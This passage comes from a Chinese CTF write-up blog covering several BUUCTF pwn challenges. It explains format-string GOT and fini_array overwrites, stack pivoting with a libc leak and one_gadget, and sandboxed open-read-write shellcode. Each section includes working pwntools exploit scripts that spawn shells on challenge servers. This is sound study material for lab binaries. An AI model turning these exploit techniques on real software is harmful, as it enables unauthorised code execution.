<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./love&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28357</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;nv sh -c sh &#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">253</span>-<span class="number">12</span>)+<span class="string">b&#x27;;&#x27;</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059332.png" alt="image-20240710105939258"></p>
<h1 id="picoctf-2018-echo-back-格式化字符串"><a href="#picoctf-2018-echo-back-格式化字符串" class="headerlink" title="picoctf_2018_echo back(格式化字符串)"></a><code>picoctf_2018_echo back(格式化字符串)</code></h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	程序中有<code>system</code>函数，有格式化字符串漏洞，<code>RELRO</code>保护为<code>Partial RELRO</code>，可以劫持<code>printf</code>的<code>got</code>表为<code>system@plt</code>。但是只有一次<code>printf</code>，然后思路就卡在这里了。后来又想到<code>printf</code>后面还有两个<code>puts</code>，可以修改<code>puts</code>的<code>got</code>表为<code>vuln</code>的地址，然后劫持程序执行流到<code>vuln</code>函数使程序再执行一遍，便可调用<code>syatem</code>函数。</p>
<h2 id="保护-源码-3"><a href="#保护-源码-3" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053000.png" alt="image-20240323103152232" style="zoom:67%;" />

<p>源码：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053566.png" alt="image-20240323103303531" style="zoom:67%;" />

<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./b&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27568</span>)</span><br><span class="line">debug(p,<span class="number">0x8048604</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_value = sys_addr&amp;<span class="number">0xffff</span></span><br><span class="line">log_addr(<span class="string">&quot;sys_value&quot;</span>)</span><br><span class="line">vuln_value = <span class="number">0x85ab</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8460</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x85ab</span>-<span class="number">0x8460</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hn&#x27;</span></span><br><span class="line">payload += p32(printf_got)+p32(printf_got+<span class="number">2</span>)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">log_addr(<span class="string">&quot;printf_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;puts_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;sys_addr&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;printf_plt&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059468.png" alt="image-20240710105915397"></p>
<h1 id="GKCTF-2021-checkin"><a href="#GKCTF-2021-checkin" class="headerlink" title="[GKCTF 2021]checkin"></a><code>[GKCTF 2021]checkin</code></h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058647.png" alt="image-20240710105852575" style="zoom:80%;" />

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053477.png" alt="image-20240328171631887"></p>
<p>​	程序中有两次<code>read</code>，第一次是将数据写到了<code>.bss</code>段，第二次有栈溢出漏洞，可以溢出<code>8</code>个字节，我们第一时间想到栈迁移。然后是一个<code>if</code>语句，如果满足条件则执行<code>exit(0)</code>直接退出程序，所以我们要想办法跳过<code>if</code>语句使程序不执行<code>exit(0)</code>。</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>​	首先我们要想办法绕过<code>if</code>语句，第一个很容易看出，我们写进<code>s1</code>的数据前<code>5</code>个字符必须为<code>admin</code>。但是我们点进第二个函数中，其实我是看不懂这些函数的，然后看别的师傅的<code>wp</code>发现是一个<code>md5</code>加密，也是要我们写到<code>buf</code>中的内容的前<code>5</code>个字符为<code>admin</code>。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png" alt="image-20240328173330991" style="zoom: 80%;" />

<p>​	然后我们开始往<code>.bss</code>段中写<code>rop</code>链，我们让第一个内存单元存储<code>admin</code>，以绕过<code>if</code>语句。然后这里又有一个问题，就是我们<code>read</code>只能读入<code>0x20(32)</code>个字节，而<code>b&#39;admin\x00\x00\x00&#39;+p64(pop_rdi)+p64(puts_got)</code>已经用了<code>24</code>个字节，也就是说我们写入<code>elf.plt[&#39;puts&#39;]</code>后便不能再写返回地址了，显然这是不行的。所以这里我们直接劫持程序执行流到<code>call puts</code>指令的地址，这样也达到了我们再次进行两次<code>read</code>的目的。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058257.png" alt="image-20240710105823187"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">call_puts_addr = <span class="number">0x4018b5</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401ab3</span></span><br><span class="line">bss_addr = <span class="number">0x602400</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi)+p64(puts_got)+p64(call_puts_addr)</span><br></pre></td></tr></table></figure>

<p>然后栈迁移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr)</span><br></pre></td></tr></table></figure>

<p>第二次布置<code>one_gadget</code>到<code>.bss</code>段，并进行栈迁移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr+<span class="number">0x18</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,elf,libc = load(<span class="string">&quot;login&quot;</span>,<span class="string">&quot;node5.buuoj.cn:29508&quot;</span>,<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./login&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,28732)</span></span><br><span class="line">debug(p,<span class="number">0x4018b5</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./login&#x27;)</span></span><br><span class="line"><span class="comment"># # libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">call_puts_addr = <span class="number">0x4018b5</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401ab3</span></span><br><span class="line">bss_addr = <span class="number">0x602400</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi)+p64(puts_got)+p64(call_puts_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BaileGeBai&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4527a</span>+libc_base <span class="comment">#0xebcf1</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr+<span class="number">0x18</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101057676.png" alt="image-20240710105754596" style="zoom:67%;" />

<p>​	最后说一下，一开始打本地一直不通并在第二次读入前程序就崩了，而打远程却通了。其实是<code>libc</code>的原因，远程的<code>libc</code>与本地的<code>libc</code>不同，一些栈帧大小也不同，所以我们把本地的<code>libc</code>换成远程的即可。</p>
<h1 id="bbctf-2020-fmt-me"><a href="#bbctf-2020-fmt-me" class="headerlink" title="bbctf_2020_fmt_me"></a><code>bbctf_2020_fmt_me</code></h1><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>在<code>gdb</code>中又学到一个查看地址中内容的命令，<code>x/s</code>以字符串的形式表示。</p>
</li>
<li><p>如果我们要修改<code>8</code>个字节，但是只写入<code>3</code>个或更少的字节，可以直接用<code>fmtstr_payload</code>函数，<code>fmtstr_payload</code>中的参数</p>
</li>
<li><p>命令分隔符<code>;</code></p>
</li>
</ol>
<h2 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053413.png" alt="image-20240405174940311"></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053521.png" alt="image-20240405175211563" style="zoom:67%;" />

<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,27604)</span></span><br><span class="line">debug(p,<span class="number">0x4012d5</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;atoi_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;system_plt&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;system&#x27;</span>]:elf.sym[<span class="string">&#x27;main&#x27;</span>]&#125;,write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh;&#x27;</span></span><br><span class="line">payload+= fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">&#x27;snprintf&#x27;</span>]:<span class="number">0x401056</span>&#125;,<span class="number">8</span>,write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>BUU刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>格式化字符串漏洞</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_sw_1</title>
    <url>/2024/03/01/BUU%E5%88%B7%E9%A2%98/ciscn_2019_sw_1/</url>
    <content><![CDATA[<h1 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><em>ciscn_2019_sw_1</em></h1><h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li><p>对于<code>RELRO</code>保护，有以下<code>3</code>种情况：</p>
<span id="more"></span>

<p><code>No RELRO</code>：<code>init.array</code>，<code>fini.array</code>，<code>got.plt</code>均可读可写</p>
<p><code>PARTIAL RELRO</code>：<code>init.array</code>，<code>fini.array</code>可读不可写，<code>got.plt</code>可读可写</p>
<p><code>FULL RELRO</code>：<code>init.array</code>，<code>fini.array</code>，<code>got.plt</code>均可读不可写</p>
</li>
<li><p>程序在加载的时候，会依次调用<code>init_arry</code>中的每一个函数指针，程序在结束的时候，会依次调用<code>fini_array</code>中的每一个函数指针，而我们可以修改其中的函数指针为<code>main</code>函数地址，使<code>main</code>函数再执行一次。一般来说，这个数组的长度为<code>1</code>，也就是说只能写一个地址。</p>
</li>
<li><p>有时候思路对了一直打不通，可能是参数偏移量算错了。</p>
</li>
</ol>
<h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102308582.png" alt="image-20240305180931509"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	程序中有一个格式化字符串漏洞，但只能执行一次格式化漏洞函数，有<code>system</code>函数。我们可以看到<code>printf(format)</code>后面<code>main</code>函数就执行完了，所以不管我们修改哪一个函数的<code>got</code>表值为<code>system@plt</code>的地址，都不行。后来看<code>wp</code>，发现我们可以修改<code>fini_array</code>的函数指针为<code>main</code>函数地址，这样就能再执行一次<code>main</code>函数了。</p>
<p>​	刚开始用下面这个方法，泄漏我们输入的第一个参数在栈中的偏移量，以为是<code>4</code>，一直打不通，调试的时候查看栈中的值，发现栈中的第<code>1,2</code>和<code>5</code>个参数都是我们输入的第一个参数，所以我们并不能确定准确的偏移量</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102309640.png" alt="image-20240305185357092"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102309060.png" alt="image-20240305185647495"></p>
<p>​	然后我发送下面这个<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaabbbb&#x27;</span>+<span class="string">b&#x27;%p%p%p%p%p&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​	现在可以看出泄漏的第<code>1</code>个参数地址是栈中的第<code>2</code>个参数，也就是说我们计算偏移量的时候要从<code>02</code>这个序号开始往下数</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102310043.png" alt="image-20240305185704092"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sw1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26399</span>)</span><br><span class="line"><span class="comment">#debug(p,0x80485A8)</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sw1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048534</span></span><br><span class="line">fini_array_addr = <span class="number">0x0804979C</span></span><br><span class="line">printf_got = <span class="number">0x0804989c</span></span><br><span class="line">sys_plt = <span class="number">0x080483d0</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)+p32(printf_got)+p32(fini_array_addr)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>-<span class="number">12</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%4$hn&#x27;</span></span><br><span class="line"><span class="comment">#这里还要减去12，因为前面发送的3个地址一共12个字节</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102310684.png" alt="image-20240305190402927"></p>
]]></content>
      <categories>
        <category>BUU刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 Not Bad</title>
    <url>/2023/11/11/BUU%E5%88%B7%E9%A2%98/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DNot%20Bad/</url>
    <content><![CDATA[<p>buu刷题记录，持续更新中……</p>
<span id="more"></span>

<h1 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]<em>Not Bad</em></h1><h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102302862.png" alt="image-20240302141924012"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	没有开<code>NX</code>保护，大概率要用<code>shellcode</code>，但是本题开了沙箱，我们只能以<code>open,read,write</code>这样的方式获取<code>flag</code>了。有栈溢出，只能溢出<code>0x10</code>个字节，而<code>buf</code>本身也只有<code>0x20</code>个字节，二者都达不到我们写的<code>shellcode</code>的长度，我们只能想其他办法。</p>
<p>​	<code>mmap()</code>函数用于将一个文件或者设备映射到内存中，从而允许对其进行直接的读写操作。本题中<code>mmap</code>为我们分配了一块可读可写的内存，起始地址为<code>0x123000</code>长度为<code>0x1000</code>一个内存页。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数原型</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>

<p>​	也就是说我们可以把<code>shellcode</code>布置到<code>mmap</code>为我们分配的地址上，然后再调用<code>shellcode</code>所在的地址即<code>0x123000</code>即可。这一步的<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000</span><br></pre></td></tr></table></figure>

<p>​	我来解释一下上面的内容：<code>shellcraft.read(0,mmap,0x100)</code>的意思是从标准输入中读入数据写到<code>mmap</code>为我们分配的地址上，然后用<code>mov rax,0x123000;call rax</code>这两个指令，调用即可。</p>
<p>​	但是我们只能溢出<code>16</code>个字节，上面这些肯定超出了<code>16</code>个字节，所以我们可以把这些布置到<code>buf</code>中，然后再栈迁移到<code>buf</code>的起始地址即可，完整的<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">sub_rsp_jmp = asm(<span class="string">&#x27;&#x27;&#x27;sub rsp,0x30;jmp rsp&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#buf+ebp+返回地址(jmp rsp) 一共0x30个字节,也就是控制程序执行流到buf的起始地址开始执行</span></span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#0x123000这个地址放的有shellcode，这里的意思就是执行shellcode</span></span><br><span class="line"></span><br><span class="line">payload = (asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+sub_rsp_jmp</span><br></pre></td></tr></table></figure>

<p>​	然后我们利用<code>shellcraft</code>生成<code>open,read,write</code>的<code>shellcode</code>。<code>shellcraft</code>是<code>pwntools</code>库的一部分，是一个用于生成各种<code>shellcode</code>的模块。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#open(&#x27;./flag&#x27;)  打开根目录下的flag文件</span></span><br><span class="line"><span class="comment">#read(3,addr,0x50)  3是上面打开的新文件的文件描述符</span></span><br><span class="line"><span class="comment">#write(1,addr,0x50)</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)        </span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)      <span class="comment">#这里我们把读出来的内容放到mmap分配给我们的内存地址上</span></span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)     </span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./bad&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28453</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">sub_rsp_jmp = asm(<span class="string">&#x27;&#x27;&#x27;sub rsp,0x30;jmp rsp&#x27;&#x27;&#x27;</span>)</span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = (asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+sub_rsp_jmp</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)        </span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)     </span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>) </span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102303820.png" alt="image-20240302212556600"></p>
]]></content>
